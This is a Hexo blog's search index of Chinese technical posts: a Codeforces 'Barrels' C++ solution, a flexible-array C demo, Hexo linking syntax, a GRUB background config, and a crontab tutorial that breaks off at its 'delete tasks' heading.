<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>cf1979Manhattan_Triangle</title>
    <url>/2025/02/22/cf1979Manhattan-Triangle/</url>
    <content><![CDATA[
]]></content>
  </entry>
  <entry>
    <title>cf2038E-Barrels</title>
    <url>/2025/02/22/cf2038E-Barrels/</url>
    <content><![CDATA[<h2 id="题意">题意</h2>
<p>有n个水缸，每个水缸之间有n -
1个联通管，初始时加入一些水，现在向水缸里加入一些黏土，使得水面升高。如果黏土高度高过连通管的高度，那么连通管将被堵死不能使用，问经过一些列操作后，第一个管中最多会有多少水</p>
<h2 id="题解">题解</h2>
<p>主要通过模拟得到</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wang XinPeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename:     CF2038E.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  10:03  2024.12.29</span></span><br><span class="line"><span class="comment">*   modify time:  10:03  2024.12.29</span></span><br><span class="line"><span class="comment">*   email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lll __int128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = <span class="number">2e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> h[maxx], v[maxx], n;</span><br><span class="line"><span class="type">double</span> sum[maxx];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">bar</span>&#123;</span><br><span class="line">	ll l,r;</span><br><span class="line">	<span class="type">double</span> h;	<span class="comment">// 桶内联通器</span></span><br><span class="line">	<span class="type">double</span> h_pre;</span><br><span class="line">&#125;s[maxx];</span><br><span class="line"><span class="type">int</span> front,rear;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	sum[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;v[i]);</span><br><span class="line">		sum[i + <span class="number">1</span>] = sum[i] + v[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i &lt; n - <span class="number">1</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;h[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	h[n - <span class="number">1</span>] = <span class="number">1e9</span>;</span><br><span class="line">	<span class="type">double</span> v_hsum = <span class="number">0</span>, v_now = <span class="number">0</span>;</span><br><span class="line">	front = <span class="number">0</span>,rear = <span class="number">-1</span>;</span><br><span class="line">	<span class="type">int</span> now_posi = n - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">do</span>&#123;</span><br><span class="line">		<span class="comment">// 栈中第一个元素为即将合并的元素</span></span><br><span class="line">		<span class="keyword">while</span>(now_posi != <span class="number">-1</span>  &amp;&amp; (rear - front &lt; <span class="number">1</span> || h[now_posi] &lt; s[rear].h ))&#123;</span><br><span class="line">			v_now += v[now_posi];</span><br><span class="line">			<span class="type">int</span> pre_height = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span>(now_posi == <span class="number">0</span>)&#123;</span><br><span class="line">				pre_height = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				pre_height = h[now_posi - <span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			s[++rear] = bar&#123;now_posi,now_posi,(<span class="type">double</span>)h[now_posi],(<span class="type">double</span>)pre_height&#125;;</span><br><span class="line">			v_hsum += pre_height;</span><br><span class="line">			now_posi--;</span><br><span class="line">			<span class="keyword">if</span>(rear - front &gt;= <span class="number">1</span> &amp;&amp; s[rear].h &gt; s[rear - <span class="number">1</span>].h)&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 第一个元素一定为下一状态的高度</span></span><br><span class="line">		<span class="type">double</span> v_next = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(rear - front &gt;= <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="type">int</span> mode = <span class="number">0</span>;</span><br><span class="line">			v_next = v_hsum + (s[rear].h - s[rear].h_pre) *(s[rear].r - s[rear].l + <span class="number">1</span>);</span><br><span class="line">			<span class="type">double</span> v_add_value = v_now + h[s[front].r - <span class="number">1</span>];</span><br><span class="line">			<span class="keyword">if</span>(v_next &lt;= v_add_value)&#123;		<span class="comment">// 此时可进入下一状态</span></span><br><span class="line">				v_hsum -= (s[rear - <span class="number">1</span>].r - s[rear - <span class="number">1</span>].l + <span class="number">1</span>) * (s[rear - <span class="number">1</span>].h_pre) + (s[rear].r - s[rear].l + <span class="number">1</span>) * (s[rear].h_pre);</span><br><span class="line">				s[rear - <span class="number">1</span>].l = s[rear].l;</span><br><span class="line">				s[rear - <span class="number">1</span>].h_pre = s[rear].h_pre;</span><br><span class="line">				rear--;</span><br><span class="line">				v_hsum += s[rear].h_pre * (s[rear].r - s[rear].l + <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(v_next &gt; v_add_value )&#123;		<span class="comment">// 此时这个管子已经没有作用了</span></span><br><span class="line">				<span class="keyword">if</span>(s[front].l != s[front].r)&#123;</span><br><span class="line">					<span class="type">double</span> length = s[front].r - s[front].l + <span class="number">1</span>;</span><br><span class="line">					v_now -= <span class="built_in">min</span>((v_add_value - (sum[s[front].l] - sum[s[rear].l])) / length , s[front].h_pre) - h[s[front].r - <span class="number">1</span>];</span><br><span class="line">				&#125;</span><br><span class="line">				v_hsum -= s[front].h_pre;</span><br><span class="line">				s[front].r--;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(s[front].l &gt; s[front].r)&#123;</span><br><span class="line">				s[front<span class="number">+1</span>].h = s[front].h;</span><br><span class="line">				front++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(s[front].l != s[front].r)&#123;	<span class="comment">// 最后一个合并的管子中管子数量大于一个时才能使用如下的算法</span></span><br><span class="line">			<span class="comment">// 元素不足两个，直接将剩余元素通过删管子删除</span></span><br><span class="line">			<span class="type">double</span> v_temp = v_now + h[s[front].r - <span class="number">1</span>];</span><br><span class="line">			<span class="type">double</span> length = s[front].r - s[front].l + <span class="number">1</span>;</span><br><span class="line">			v_now = v_temp * (length - <span class="number">1</span>) / length;</span><br><span class="line">			s[front].r--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">while</span>(!(rear == front &amp;&amp; s[front].l == s[front].r &amp;&amp; s[front].l == <span class="number">0</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%0.20f\n&quot;</span>,v_now);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#include&lt;bits/stdc++.h&gt;</span></span><br><span class="line"><span class="comment">using namespace std;</span></span><br><span class="line"><span class="comment">typedef long long ll;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#define N 200000</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int i,j,k,n,m,t,l,r,L=N+1,R=N,h[N+50],a[N+50],q[N+N+50];</span></span><br><span class="line"><span class="comment">double tot,h1,h2;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()&#123;</span></span><br><span class="line"><span class="comment">	ios::sync_with_stdio(0); cin.tie(0);</span></span><br><span class="line"><span class="comment">	scanf(&quot;%d&quot;,&amp;n);</span></span><br><span class="line"><span class="comment">	for(i=1;i&lt;=n;i++)scanf(&quot;%d&quot;,&amp;a[i]);</span></span><br><span class="line"><span class="comment">	for(i=2;i&lt;=n;i++)scanf(&quot;%d&quot;,&amp;h[i]);</span></span><br><span class="line"><span class="comment">	h[1]=1e9;</span></span><br><span class="line"><span class="comment">	l=r=n; tot=a[n];</span></span><br><span class="line"><span class="comment">	for(r=n;r&gt;=2;r--)while(1)&#123;</span></span><br><span class="line"><span class="comment">		while(L&lt;=R&amp;&amp;q[R]&gt;r)R--;</span></span><br><span class="line"><span class="comment">		h1=(tot+h[r])/(r-l+1);</span></span><br><span class="line"><span class="comment">		if(L&lt;=R)&#123;</span></span><br><span class="line"><span class="comment">			h2=h[q[R]];</span></span><br><span class="line"><span class="comment">			if(h1&lt;h2)&#123;tot-=(h2-h[r]); break;&#125;</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		if(h1&lt;h[l])&#123;tot-=(h1-h[r]); break;&#125;</span></span><br><span class="line"><span class="comment">		while(L&lt;=R&amp;&amp;h[q[L]]&lt;=h[l])L++;</span></span><br><span class="line"><span class="comment">		q[--L]=l; l--; tot+=a[l];</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	printf(&quot;%.20lf&quot;,tot);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>arduino</title>
    <url>/2025/02/22/arduino/</url>
    <content><![CDATA[<h1 id="arduino连接蓝牙">arduino连接蓝牙</h1>
<p><a
href="https://arduino.nxez.com/2018/04/19/arduino-uses-hc05-bluetooth-module-to-connect-the-phone.html">蓝牙连接</a></p>
<h1 id="lilygo开发">lilygo开发</h1>
<p><a
href="https://github.com/Xinyuan-LilyGO/LilyGo-Document/tree/master?tab=readme-ov-file">github地址</a></p>
]]></content>
      <tags>
        <tag>嵌入式</tag>
      </tags>
  </entry>
  <entry>
    <title>c语言变长数组</title>
    <url>/2025/02/22/c%E8%AF%AD%E8%A8%80%E5%8F%98%E9%95%BF%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h1 id="c语言变长数组的实现">c语言变长数组的实现</h1>
<p>变长数组指的是数组的长度可以任意改变，而不是可以定义任意长度的数组</p>
<p>这里给出他的写法</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ss</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n;      <span class="comment">// 变长数组的长度</span></span><br><span class="line">  <span class="type">char</span> a[<span class="number">0</span>];  <span class="comment">// 不可写为char *a, 否则会报错</span></span><br><span class="line">  <span class="comment">// 注意这里的a[0]不占内存，但是*a占内存</span></span><br><span class="line">  <span class="comment">// 因为sizeof(a) == 0, 所以需要一个n来给出当前变长数组的长度。</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  n = <span class="number">10</span>;</span><br><span class="line">  <span class="type">int</span> saf[n];           <span class="comment">// 这不是一个变长数组，因为一旦定义之后，就不能改变大小</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%ld&quot;</span>,<span class="built_in">sizeof</span>(saf));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 定义变长数组大小为n</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">ss</span> *b = (<span class="keyword">struct</span> ss *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> ss) + n * <span class="built_in">sizeof</span>(<span class="type">char</span>)); </span><br><span class="line">  b-&gt;n = n;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 现在改变数组的长度</span></span><br><span class="line">  n =  <span class="number">100</span>;</span><br><span class="line">  b = (<span class="keyword">struct</span> ss *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> ss) + n * <span class="built_in">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">  b-&gt;n = n;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> c[<span class="number">10</span>] = <span class="string">&quot;wfasfa&quot;</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(b-&gt;a,c,<span class="built_in">sizeof</span>(c));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,b-&gt;a);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 变长数组的大小不能使用sizeof得到</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>,<span class="built_in">sizeof</span>(b-&gt;a));</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">ss</span> *d = (<span class="keyword">struct</span> ss *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> ss) + <span class="number">10</span> * <span class="built_in">sizeof</span>(<span class="type">char</span> ));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>参考自：<br />
https://stackoverflow.com/questions/3607859/meaning-of-char-arr0<br />
https://blog.csdn.net/hyqsong/article/details/50863746<br />
https://blog.csdn.net/ligeforrent/article/details/48639277</p>
]]></content>
  </entry>
  <entry>
    <title>dp优化</title>
    <url>/2025/02/22/dp%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h2 id="dp斜率优化">dp斜率优化</h2>
<h2 id="wqs二分">wqs二分</h2>
<h2 id="四边形不等式">四边形不等式</h2>
]]></content>
  </entry>
  <entry>
    <title>hexo站内引用</title>
    <url>/2025/02/22/hexo%E7%AB%99%E5%86%85%E5%BC%95%E7%94%A8/</url>
    <content><![CDATA[<h1 id="参考">参考</h1>
<p><a href="https://zhuanlan.zhihu.com/p/163020630">知乎参考链接</a></p>
<h1 id="站内引用">站内引用</h1>
<pre><code>以下 post_path 和 post_link 两个属性方法的区别是：
post_path 返回的是字符串；
post_link 返回的是超链接； </code></pre>
<ol type="1">
<li><p><code>post_link</code>引用 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% post_link 站内文章标题 文章内显示标题的名字 是否对字符转义&#125;</span><br><span class="line">站内目标文章的标题用来替代目标文章的标题在本页面内显示的文字，同时作为鼠标悬浮的时候显示title属性的文字，默认链接文字是文章的标题,如果包含空格的话那么使用英文单引号裹起来，否则的话不需要单引号  </span><br><span class="line">true或者false，用来控制是否对引用文章的标题和自定义标题里的特殊字符进行转义，默认值为true转义  %&#125;</span><br><span class="line"></span><br><span class="line">注意：</span><br><span class="line">1.生成的链接默认不带有 target=”_blank” 属性； </span><br><span class="line">2.在使用此标签时可以 忽略 文章文件所在的 路径 或者 文章的永久链接信息、如语言、日期； </span><br><span class="line"> 只要存在一个名为 站内文章标题.md 的文章文件即可。</span><br><span class="line"></span><br><span class="line">例如下面的链接:</span><br><span class="line">&#123;% post_link 容斥原理 站内文章 false %&#125;</span><br></pre></td></tr></table></figure> <a href="/2024/05/08/%E5%AE%B9%E6%96%A5%E5%8E%9F%E7%90%86/" title="容斥原理">站内文章</a></p></li>
<li><p>post_path只会以字符串形式返回文章路径，用法
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法： </span><br><span class="line">花括号%  固定的属性asset_path  资源文件夹中资源的名称，例如图片名称及后缀不需要路径  %花括号</span><br><span class="line"></span><br><span class="line">示例： </span><br><span class="line">&#123;% asset_path test.jpg %&#125; </span><br><span class="line"></span><br><span class="line">返回 test.jpg 图片资源的站内链接地址字符串如下所示： </span><br><span class="line">/2020/03/14/Markdown写作模板/test.jpg</span><br></pre></td></tr></table></figure></p></li>
</ol>
]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>grub_背景图片设置</title>
    <url>/2025/02/22/grub-%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="grub添加背景图片">grub添加背景图片</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># If you change this file, run &#x27;update-grub&#x27; afterwards to update</span></span><br><span class="line"><span class="comment"># /boot/grub/grub.cfg.</span></span><br><span class="line"><span class="comment"># For full documentation of the options in this file, see:</span></span><br><span class="line"><span class="comment">#   info -f grub -n &#x27;Simple configuration&#x27;</span></span><br><span class="line"></span><br><span class="line">GRUB_DEFAULT=0</span><br><span class="line">GRUB_TIMEOUT_STYLE=menu</span><br><span class="line">GRUB_TIMEOUT=10</span><br><span class="line">GRUB_DISTRIBUTOR=`lsb_release -i -s 2&gt; /dev/null || <span class="built_in">echo</span> Debian`</span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=<span class="string">&quot;quiet splash&quot;</span></span><br><span class="line">GRUB_CMDLINE_LINUX=<span class="string">&quot;&quot;</span></span><br><span class="line">GRUB_BACKGROUND=<span class="string">&quot;/home/skt1faker/Picture/acm-icpc.png&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment to enable BadRAM filtering, modify to suit your needs</span></span><br><span class="line"><span class="comment"># This works with Linux (no patch required) and with any kernel that obtains</span></span><br><span class="line"><span class="comment"># the memory map information from GRUB (GNU Mach, kernel of FreeBSD ...)</span></span><br><span class="line"><span class="comment">#GRUB_BADRAM=&quot;0x01234567,0xfefefefe,0x89abcdef,0xefefefef&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment to disable graphical terminal (grub-pc only)</span></span><br><span class="line"><span class="comment">#GRUB_TERMINAL=console</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The resolution used on graphical terminal</span></span><br><span class="line"><span class="comment"># note that you can use only modes which your graphic card supports via VBE</span></span><br><span class="line"><span class="comment"># you can see them in real GRUB with the command `vbeinfo&#x27;</span></span><br><span class="line"><span class="comment">#GRUB_GFXMODE=640x480</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment if you don&#x27;t want GRUB to pass &quot;root=UUID=xxx&quot; parameter to Linux</span></span><br><span class="line"><span class="comment">#GRUB_DISABLE_LINUX_UUID=true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment to disable generation of recovery mode menu entries</span></span><br><span class="line"><span class="comment">#GRUB_DISABLE_RECOVERY=&quot;true&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment to get a beep at grub start</span></span><br><span class="line"><span class="comment">#GRUB_INIT_TUNE=&quot;480 440 1&quot;</span></span><br><span class="line">GRUB_DISABLE_OS_PROBER=<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>背景图片的关键字是<code>GRUB_BACKGROUND</code>只要修改这个关键字就可以，之后保存。在终端中输入<code>sudo update-grub</code>更新即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">skt1faker@nwpu ~</span><br><span class="line">$ <span class="built_in">sudo</span> update-grub                                                          [19:59</span><br><span class="line">Sourcing file `/etc/default/grub<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Sourcing file `/etc/default/grub.d/init-select.cfg&#x27;</span></span><br><span class="line">Generating grub configuration file ...</span><br><span class="line">Found background: /home/skt1faker/Picture/acm-icpc.png</span><br><span class="line">Found background image: /home/skt1faker/Picture/acm-icpc.png</span><br><span class="line">Found linux image: /boot/vmlinuz-5.15.0-107-generic</span><br><span class="line">Found initrd image: /boot/initrd.img-5.15.0-107-generic</span><br><span class="line">Found linux image: /boot/vmlinuz-5.15.0-106-generic</span><br><span class="line">Found initrd image: /boot/initrd.img-5.15.0-106-generic</span><br><span class="line">Found linux image: /boot/vmlinuz-5.13.0-51-generic</span><br><span class="line">Found initrd image: /boot/initrd.img-5.13.0-51-generic</span><br><span class="line">Found linux image: /boot/vmlinuz-5.11.0-34-generic</span><br><span class="line">Found initrd image: /boot/initrd.img-5.11.0-34-generic</span><br><span class="line">Found linux image: /boot/vmlinuz-5.11.0-27-generic</span><br><span class="line">Found initrd image: /boot/initrd.img-5.11.0-27-generic</span><br><span class="line">Found linux image: /boot/vmlinuz-5.11.0-25-generic</span><br><span class="line">Found initrd image: /boot/initrd.img-5.11.0-25-generic</span><br><span class="line">Found Windows Boot Manager on /dev/nvme0n1p1@/efi/Microsoft/Boot/bootmgfw.efi</span><br><span class="line">Found Ubuntu 20.04.4 LTS (20.04) on /dev/nvme0n1p6</span><br><span class="line">Adding boot menu entry <span class="keyword">for</span> UEFI Firmware Settings</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>linux定时任务</title>
    <url>/2025/02/22/linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
    <content><![CDATA[<h1 id="参考">参考</h1>
<p><a
href="https://linuxtools-rst.readthedocs.io/zh-cn/latest/tool/crontab.html">linux工具</a><br />
<a
href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">runoob定时任务</a></p>
<p>这里使用<code>notify-send</code>来实现crontab的演示</p>
<h1 id="开启cron服务">开启cron服务</h1>
<p>首先要开启cron服务才能使用crontab命令，使用<code>systemctl status cron</code>检查cron服务的状态，启动状态应为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ systemctl status cron                                            </span><br><span class="line">● cron.service - Regular background program processing daemon</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: <span class="built_in">enable</span>&gt;</span><br><span class="line">     Active: active (running) since Mon 2024-05-13 18:11:43 HKT; 7h left</span><br><span class="line">       Docs: man:cron(8)</span><br><span class="line">   Main PID: 1286 (cron)</span><br><span class="line">      Tasks: 1 (<span class="built_in">limit</span>: 18386)</span><br><span class="line">     Memory: 4.2M</span><br><span class="line">     CGroup: /system.slice/cron.service</span><br><span class="line">             └─1286 /usr/sbin/cron -f</span><br><span class="line"></span><br><span class="line">Warning: some journal files were not opened due to insufficient permissions.</span><br></pre></td></tr></table></figure>
<p>如果没有启动可以使用<code>systemctl enable cron</code>使得开启可以启动</p>
<h1 id="添加任务">添加任务</h1>
<p>添加任务有两种方式，使用<code>crontab -e</code>或<code>crontab 周期任务文件</code>。</p>
<ol type="1">
<li><code>crontab -e</code>直接编辑文件，文件暂时在/tmp中，也就是说，这个文件在crontab执行任务时并不重要，只是用来传递需要执行的任务和执行周期。</li>
</ol>
<p>例如我在终端输入<code>crontab -e</code>后，选择vim编辑器书写周期执行的命令,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Edit this file to introduce tasks to be run by cron.</span><br><span class="line"># </span><br><span class="line"># Each task to run has to be defined through a single line</span><br><span class="line"># indicating with different fields when the task will be run</span><br><span class="line"># and what command to run for the task</span><br><span class="line"># </span><br><span class="line"># To define the time you can provide concrete values for</span><br><span class="line"># minute (m), hour (h), day of month (dom), month (mon),</span><br><span class="line"># and day of week (dow) or use &#x27;*&#x27; in these fields (for &#x27;any&#x27;).</span><br><span class="line"># </span><br><span class="line"># Notice that tasks will be started based on the cron&#x27;s system</span><br><span class="line"># daemon&#x27;s notion of time and timezones.</span><br><span class="line"># </span><br><span class="line"># Output of the crontab jobs (including errors) is sent through</span><br><span class="line"># email to the user the crontab file belongs to (unless redirected).</span><br><span class="line"># </span><br><span class="line"># For example, you can run a backup of all your user accounts</span><br><span class="line"># at 5 a.m every week with:</span><br><span class="line"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span><br><span class="line"># </span><br><span class="line"># For more information see the manual pages of crontab(5) and cron(8)</span><br><span class="line"># </span><br><span class="line"># m h  dom mon dow   command</span><br><span class="line"></span><br><span class="line">*/1 * * * * echo &quot;shjfafhsakf&quot;|mail -s &quot;linux-notify&quot; a@163.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后一行为输入的执行时间 +
命令，可以结束后保存可以周期性的执行命令。当前命令是每隔一分钟发送给a@163.com一封邮件，观察邮件列表可以发现每隔一分钟接收到了一封邮件</p>
<p><img src="linux_mail_test.png" /></p>
<p>设置完corntab的任务后，再次使用crontab
-e会继续上次的编辑内容添加命令。</p>
<ol start="2" type="1">
<li><code>crontab 周期任务文件</code>，这个周期任务文件同样不重要，内容同上文件形式即可。</li>
</ol>
<p>设定周期命令的方式是周期 +
命令，这个周期形式为"分是日月周"，具体如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分 时 日 月 星期 要运行的命令</span><br><span class="line"></span><br><span class="line">    第1列分钟0～59</span><br><span class="line">    第2列小时0～23（0表示子夜）</span><br><span class="line">    第3列日1～31</span><br><span class="line">    第4列月1～12</span><br><span class="line">    第5列星期0～7（0和7表示星期天）</span><br><span class="line">    第6列要运行的命令</span><br></pre></td></tr></table></figure></p>
<p>而时间的设定也有很多技巧 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 取值范围内的所有数字</span><br><span class="line">/ 每过多少个数字</span><br><span class="line">- 从X到Z</span><br><span class="line">，散列数字</span><br></pre></td></tr></table></figure> 举几个例子 1.
<code>* * * * * myCommand</code>表示每分钟都执行myCommand 2.
<code>3,15 * * * * myCommand</code>表示没小时的第3和第15分钟执行，这里使用了散列技巧
3.
<code>3,15 8-11 * * * myCommand</code>表示每天8-11时的第3和第15分钟执行，这里使用了'-';
4.
<code>3,15 8-11 */2  *  * myCommand</code>表示每隔两天的上午8-11点的第3和15分钟执行command<br />
5.
<code>45 4 1,10,22 * * /etc/init.d/smb restart</code>表示每个月的1，10，22号的4.45分执行smb的重启
6.
<code>0 23-7/1 * * * /etc/init.d/smb restart</code>晚上23-早上7点每一小时重启一次smb</p>
<h1 id="查看任务">查看任务</h1>
<p><code>crontab -l</code>可以输出任务列表，
也可以将任务内容重定向到其他文件中进行副本保存。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">skt1faker@nwpu ~/rm</span><br><span class="line">master* $ crontab -l &gt; <span class="built_in">test</span>                                                [11:10:51]</span><br><span class="line">(homework)</span><br><span class="line">skt1faker@nwpu ~/rm</span><br><span class="line">master* $ vim <span class="built_in">test</span>                                                         [11:10:55]</span><br><span class="line">(homework)</span><br><span class="line">skt1faker@nwpu ~/rm</span><br><span class="line">master* $ <span class="built_in">cat</span> <span class="built_in">test</span>                                                         [11:11:00]</span><br><span class="line"><span class="comment"># Edit this file to introduce tasks to be run by cron.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Each task to run has to be defined through a single line</span></span><br><span class="line"><span class="comment"># indicating with different fields when the task will be run</span></span><br><span class="line"><span class="comment"># and what command to run for the task</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To define the time you can provide concrete values for</span></span><br><span class="line"><span class="comment"># minute (m), hour (h), day of month (dom), month (mon),</span></span><br><span class="line"><span class="comment"># and day of week (dow) or use &#x27;*&#x27; in these fields (for &#x27;any&#x27;).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Notice that tasks will be started based on the cron&#x27;s system</span></span><br><span class="line"><span class="comment"># daemon&#x27;s notion of time and timezones.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Output of the crontab jobs (including errors) is sent through</span></span><br><span class="line"><span class="comment"># email to the user the crontab file belongs to (unless redirected).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For example, you can run a backup of all your user accounts</span></span><br><span class="line"><span class="comment"># at 5 a.m every week with:</span></span><br><span class="line"><span class="comment"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For more information see the manual pages of crontab(5) and cron(8)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line"></span><br><span class="line">*/1 * * * * <span class="built_in">echo</span> <span class="string">&quot;shjfafhsakf&quot;</span>|mail -s <span class="string">&quot;linux-notify&quot;</span> skk1faker@163.com</span><br><span class="line">(homework)</span><br><span class="line">skt1faker@nwpu ~/rm</span><br></pre></td></tr></table></figure>
<h1 id="删除任务">删除任务</h1>
